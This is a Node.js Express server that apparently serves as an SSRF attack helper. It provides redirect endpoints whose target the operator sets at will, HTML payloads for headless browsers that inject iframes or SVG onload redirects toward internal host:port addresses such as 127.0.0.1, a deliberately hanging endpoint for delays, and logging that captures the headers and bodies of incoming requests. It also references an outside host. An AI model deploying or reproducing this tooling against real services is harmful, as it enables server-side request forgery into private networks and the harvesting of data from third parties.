//require('newrelic');
// arm
const path = require('path');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const cors = require('cors');

const PORT = process.env.PORT || 808;

app.use(cors())
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


let temp = `/1x1.png?${Math.random()}`;

app.get('/ssrf', (req, res, next) =>{
    res.setHeader('Location', temp)
    res.statusCode= 301;
    res.send()
});

// download file
app.get('/d', (req, res, next) => {	
	res.setHeader('content-disposition', `attachment; filename="${temp}"`);
	res.statusCode=200;
	let array = new Array(temp);
	res.send(temp+array.join());
});

const ssrfSet = (req, res, next) =>{
    let statusCode = 307
    //pass options and head
    if (req.method === 'OPTIONS' || req.method === 'HEAD') {
        res.statusCode = 200;
    	res.end('<s>Hello world! OK.');
	return
    }
    if(!isNaN(req.params.reason)){
        statusCode = Number(req.params.reason)
    }
    console.log(req.headers);
    console.log(JSON.stringify(req.body));
    res.setHeader('Location', temp)
    res.statusCode= statusCode;
    res.end('<s>Hello world! OK.');
}

const ssrf = (req, res, next) =>{
    //pass options and head
    console.log('param',req.params)
    console.log("quer" ,req.query)
    if (req.method === 'OPTIONS' || req.method === 'HEAD') {
        res.statusCode = 200;
    	res.send('<s>Hello world! OK.');
	return
    }
    // console.log(req.headers);
    // console.log(JSON.stringify(req.body));
    res.setHeader('Location', temp)
    res.statusCode= 307;
    res.send('<s>Hello world! OK.');
}
// short variant
app.use('/s/', ssrf);
app.use('/r/:reason', ssrfSet);
app.use('/4610CCF1F8B21151', ssrf)

app.post('/ssrf', (req, res, next) =>{
    temp = req.body.data || '/';
    console.log(temp);
    res.send(`Saved ${temp}`)
});

// rout witout response
app.use('/noresponse', (req, res) =>{
    console.log(req.headers)
    console.log(JSON.stringify(req.body))
    setTimeout(function() {
	    res.statusCode= 999;
       res.end(' World\n');
    },99999999);
});

// html ssrf presets for headless browser /rhtml/127.0.0.1:80fsi
// f - iframe
// s - svg onload redirect
// i - no response image for delay
app.use('/rhtml/:uid', (req, res) =>{
	let tmp = '<html><head></head><body>Hello World!<script></script><svg><img></body></html>';
	const uid = req.params.uid;
	let host = uid.split(':')[0];
	let port = parseInt(uid.split(':')[1],10);
	let location = `http://${host}:${port}`;
	
	if(uid.includes('f')){
		tmp = tmp.replace('<script>', `<script>f=document.createElement('iframe');f.src = '${location}';document.body.appendChild(f);</script>`)
	}
	
	if(uid.includes('s')){
		tmp = tmp.replace('<svg>', `<svg/onload="location='${location}'">`)
	}

	if(uid.includes('i')){
		tmp = tmp.replace('<svg>', '<img src="http://srcb.fun/noresponse">')
	}
	
	res.status(200).send(tmp);
});

app.use((req, res) => {
    const rMethod = req.method;
    const rUrl = req.url;
    const rHeaders = req.headers;
    if(rUrl.match(/\/wp-\w+/g)){
	    res.setHeader('Location', 'http://127.0.0.1')
	    res.statusCode= 301;
	    res.send('OOPS');
    } else {
    console.info('START-------------------------------------------------------------\n'+rMethod + ' ' + rUrl);
    console.info(rHeaders);
    console.info('BODY1-------------------------------------------------------------\n'+JSON.stringify(req.body)+'\n----\n'+JSON.stringify(req.params));
    res.end(rUrl)
    console.info('END---------------------------------------------------------------\n\n\n');
    }
});

app.listen(PORT, ()=>{
    console.log(`Server is working on ${PORT}`);
});
